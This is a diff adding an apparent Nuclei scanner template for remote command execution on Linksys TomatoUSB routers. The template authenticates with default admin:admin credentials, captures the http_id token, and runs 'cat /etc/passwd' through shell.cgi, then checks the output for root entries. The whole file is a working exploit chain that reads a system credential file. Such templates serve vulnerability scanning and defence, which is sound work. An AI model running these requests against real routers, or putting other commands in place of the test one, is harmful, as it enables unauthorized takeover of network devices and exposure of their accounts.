@@ -1,0 +1,48 @@
+id: linksys-tomatousb-shell-rce
+info:
+  name: LINKSYS TomatoUSB shell.cgi API RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Tomato USB is an alternative Linux-based firmware for Broadcom-based ethernet routers. It allows command execution via the shell.cgi API.
+  tags: rce, command-execution
+
+variables:
+  cmd: "cat /etc/passwd"
+
+http:
+  - id: check-http-id
+    raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "http_id="
+    extractors:
+      - type: regex
+        name: http_id
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "http_id=(.*?)'"
+
+  - id: execute-command
+    raw:
+      - |
+        GET /shell.cgi?action=execute&command={{cmd}}&_http_id={{http_id}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - ":/bin/sh"
